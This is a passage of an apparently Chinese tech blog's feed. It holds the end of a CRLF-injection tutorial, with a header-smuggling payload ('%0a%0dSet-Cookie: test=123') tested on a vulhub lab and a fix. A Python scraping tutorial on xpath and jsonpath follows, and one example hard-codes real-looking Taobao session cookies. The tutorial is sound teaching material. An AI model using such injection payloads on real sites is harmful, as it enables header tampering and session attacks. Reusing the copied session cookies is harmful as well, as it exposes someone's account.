class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码意思是说当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。</p><p>此时服务器端接收到的url参数值是我们修改后的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/xxx%0a%0dSet-Cookie: test=123</span><br></pre></td></tr></table></figure><p>在url参数值拼接到Location字符串中，设置成响应头后，响应头就会看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: test=123</span><br></pre></td></tr></table></figure><br><h2 id="三、本地测试"><a href="#三、本地测试" class="headerlink" title="三、本地测试"></a>三、本地测试</h2><p>在 Ubuntu 上利用 docker 搭建 vulhub 靶场，进入 <code>/vulhub/nginx/insecure-configuration</code> （docker 的安装方法这里就不赘述），8080 端口是 CRLF 注入的靶场。</p><p>启动容器 docker：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/CRLF-2.png" alt="CRLF-2"></p><p>构造 payload ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%0a%0dSet-Cookie: test=123</span><br></pre></td></tr></table></figure><p>查看响应头，发现有个字段是 <code>Set-Cookie: test=123</code>，说明响应头文件的信息被我们修改了。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/CRLF-1.png" alt="CRLF-1"></p><br><h2 id="四、修复方法"><a href="#四、修复方法" class="headerlink" title="四、修复方法"></a>四、修复方法</h2><p>服务端收到前端过来的参数，在加入Location之前，需要过滤 \r 、\n 之类的行结束符，避免输入的数据污染其它HTTP首部字段。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CRLF 注入&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>Python爬虫-解析</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/</id>
    <published>2023-05-12T13:03:55.780Z</published>
    <updated>2023-05-12T13:11:37.281Z</updated>
    
    <content type="html"><![CDATA[<p>解析</p><span id="more"></span><h4 id="一、xpath"><a href="#一、xpath" class="headerlink" title="一、xpath"></a>一、xpath</h4><h5 id="1、xpath的基本使用"><a href="#1、xpath的基本使用" class="headerlink" title="1、xpath的基本使用"></a>1、xpath的基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;a1&quot;</span>&gt;</span>厦门<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l2&quot;</span>&gt;</span>福州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l3&quot;</span>&gt;</span>泉州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>漳州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>南平<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c3&quot;</span>&gt;</span>龙岩<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">tree = etree.parse(<span class="string">&#x27;01_解析_xpath的基本使用.html&#x27;</span>)</span><br><span class="line">li_list = tree.xpath(<span class="string">&#x27;//ul/li/text()&#x27;</span>)</span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;, &#x27;泉州&#x27;, &#x27;漳州&#x27;, &#x27;南平&#x27;, &#x27;龙岩&#x27;]</span></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># # [&#x27;厦门&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/@class&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;a1&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询包含 “字符串” 的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[contains(@id,&quot;l&quot;)]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;, &#x27;泉州&#x27;]</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询以 “字符串” 开头的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[starts-with(@id,&quot;c&quot;)]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;漳州&#x27;, &#x27;南平&#x27;, &#x27;龙岩&#x27;]</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与语句 查询id为l1 和 class为a1的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot; and @class=&quot;a1&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或语句 查询id为l1 和 id为l2的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/text() | //ul/li[@id=&quot;l2&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;]</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(li_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(li_list))</span><br></pre></td></tr></table></figure><h5 id="2、xpath-获取百度-百度一下"><a href="#2、xpath-获取百度-百度一下" class="headerlink" title="2、xpath 获取百度-百度一下"></a>2、xpath 获取百度-百度一下</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tree = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">result = tree.xpath(<span class="string">&#x27;//input[@type=&quot;submit&quot;]/@value&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h5 id="3、xpath-站长素材"><a href="#3、xpath-站长素材" class="headerlink" title="3、xpath 站长素材"></a>3、xpath 站长素材</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_request</span>(<span class="params">page</span>):</span><br><span class="line">    <span class="keyword">if</span>(page == <span class="number">1</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://sc.chinaz.com/tupian/QiCheTuPian.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">&#x27;https://sc.chinaz.com/tupian/QiCheTuPian_&#x27;</span> + <span class="built_in">str</span>(page) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">request</span>):</span><br><span class="line">    response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">    content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down_loads</span>(<span class="params">content</span>):</span><br><span class="line">    tree = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意：xpath方法返回的值是列表类型</span></span><br><span class="line">    name_list = tree.xpath(<span class="string">&#x27;//div[@class=&quot;container&quot;]//img/@alt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    src_list = tree.xpath(<span class="string">&#x27;//div[@class=&quot;container&quot;]//img/@data-original&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">        name = name_list[i]</span><br><span class="line">        src = src_list[i]</span><br><span class="line">        url =<span class="string">&#x27;https:&#x27;</span> + src</span><br><span class="line">        <span class="built_in">print</span>(name,src)</span><br><span class="line">        result = urllib.request.urlretrieve(url = url,filename =<span class="string">&#x27;./QiCheImage/&#x27;</span> + name + <span class="string">&#x27;.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入起始页码：&#x27;</span>))</span><br><span class="line">    end_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入结束页码：&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(start_page,end_page+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># （1）请求对象的定制</span></span><br><span class="line">        request = create_request(page)</span><br><span class="line">        <span class="comment"># （2）获取请求的数据</span></span><br><span class="line">        content = get_content(request)</span><br><span class="line">        <span class="comment"># （3）下载数据</span></span><br><span class="line">        down_loads(content)</span><br></pre></td></tr></table></figure><br><h4 id="二、jsonpath"><a href="#二、jsonpath" class="headerlink" title="二、jsonpath"></a>二、jsonpath</h4><h5 id="1、jsonpath-的基本使用"><a href="#1、jsonpath-的基本使用" class="headerlink" title="1、jsonpath 的基本使用"></a>1、jsonpath 的基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;store&quot;: &#123;</span><br><span class="line">    &quot;book&quot;: [</span><br><span class="line">      &#123; &quot;category&quot;: &quot;reference&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Nigel Rees&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Sayings of the Century&quot;,</span><br><span class="line">        &quot;price&quot;: 8.95</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Evelyn Waugh&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Sword of Honour&quot;,</span><br><span class="line">        &quot;price&quot;: 12.99</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Herman Melville&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Moby Dick&quot;,</span><br><span class="line">        &quot;isbn&quot;: &quot;0-553-21311-3&quot;,</span><br><span class="line">        &quot;price&quot;: 8.99</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;J. R. R. Tolkien&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;The Lord of the Rings&quot;,</span><br><span class="line">        &quot;isbn&quot;: &quot;0-395-19395-8&quot;,</span><br><span class="line">        &quot;price&quot;: 22.99</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;bicycle&quot;: &#123;</span><br><span class="line">      &quot;color&quot;: &quot;red&quot;,</span><br><span class="line">      &quot;price&quot;: 19.95</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">obj = json.load(<span class="built_in">open</span>(<span class="string">&#x27;04_解析_jsonpath之基本使用.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 书的所有作者</span></span><br><span class="line"><span class="comment"># author_list = jsonpath.jsonpath(obj,&#x27;$.store.book[*].author&#x27;)</span></span><br><span class="line"><span class="comment"># print(author_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有作者（除了书之外的作者）</span></span><br><span class="line"><span class="comment"># author_list = jsonpath.jsonpath(obj,&#x27;$..author&#x27;)</span></span><br><span class="line"><span class="comment"># print(author_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店以下的信息</span></span><br><span class="line"><span class="comment"># tag_list = jsonpath.jsonpath(obj,&#x27;$.store.*&#x27;)</span></span><br><span class="line"><span class="comment"># print(tag_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店下面的price信息</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$.store..price&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三本书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[2]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后一本书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[(@.length-1)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 前两本书</span></span><br><span class="line"><span class="comment"># (1) book_list = jsonpath.jsonpath(obj,&#x27;$..book[0,1]&#x27;)</span></span><br><span class="line"><span class="comment"># (2) book_list = jsonpath.jsonpath(obj,&#x27;$..book[:2]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 含有 isbn 的书 条件判断要用? 在()前加?</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[?(@.isbn)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># price 大于10 的书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[?(@.price&gt;10)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示全部信息</span></span><br><span class="line">book_list = jsonpath.jsonpath(obj,<span class="string">&#x27;$..*&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(book_list)</span><br></pre></td></tr></table></figure><h5 id="2、jsonpath-淘票票"><a href="#2、jsonpath-淘票票" class="headerlink" title="2、jsonpath 淘票票"></a>2、jsonpath 淘票票</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://dianying.taobao.com/cityAction.json?activityId&amp;_ksTS=1660476866218_108&amp;jsoncallback=jsonp109&amp;action=cityAction&amp;n_s=new&amp;event_submit_doGetAllRegion=true&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment"># &#x27;:authority&#x27;: &#x27;dianying.taobao.com&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:method&#x27;: &#x27;GET&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:path&#x27;: &#x27;/cityAction.json?activityId&amp;_ksTS=1660476866218_108&amp;jsoncallback=jsonp109&amp;action=cityAction&amp;n_s=new&amp;event_submit_doGetAllRegion=true&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:scheme&#x27;: &#x27;https&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;accept-encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bx-v&#x27;</span>: <span class="string">&#x27;2.2.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;cna=/2aWGsWi/loCAXAx9pQ8UTSC; miid=684269234985765900; enc=9HDdNFs5gyOQuzdApfEJPk50Cwf%2FlLh9K%2Fiabx9RI%2BBmo2QtS59XpwW8aETF8t%2B%2B6MYMx88YU%2BS8L4go%2BGzwGGiL83ltVyw%2BBnInqwnsUeKKaZ8gFHx9AjTGjM%2BRdo7e; thw=cn; _m_h5_tk=ec3acd5ea85c2c22f19dfdd9c5e72e6a_1660287437842; _m_h5_tk_enc=a68b03acb80f902b4d2403082acdfcac; t=fc3a35a1949a5061d43a8ad7a0aa32e6; cookie2=1b381909a7657c7e522221e067a1186f; v=0; _tb_token_=e7e0101153be8; xlly_s=1; l=eBxmMRGgLLqMpU8MBOfanurza77O8IRYmuPzaNbMiOCPO55H5AxcW6YtVWYMCnGVh6PeR3k0hW66BeYBqC2sjqj2nAHOr3Dmn; tfstk=croRBJ_31IAugGz_RYL08pVLpjvGZF68tTNdvD7Lz7senRsdiAniXYuwPJPawKC..; isg=BLa23tHByPmhSbxqKPOUAR5xB-y41_oRIlkEAyCf8hk0Y1b9iGaOIVUdez8PT_Ip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://dianying.taobao.com/index.htm?n_s=new&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Chromium&quot;;v=&quot;104&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;104&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-requested-with&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = content.split(<span class="string">&#x27;(&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;)&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;taopp.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">obj = json.load(<span class="built_in">open</span>(<span class="string">&#x27;taopp.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">city_list = jsonpath.jsonpath(obj,<span class="string">&#x27;$..regionName&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(city_list)</span><br></pre></td></tr></table></figure><br><h4 id="三、bs4"><a href="#三、bs4" class="headerlink" title="三、bs4"></a>三、bs4</h4><h5 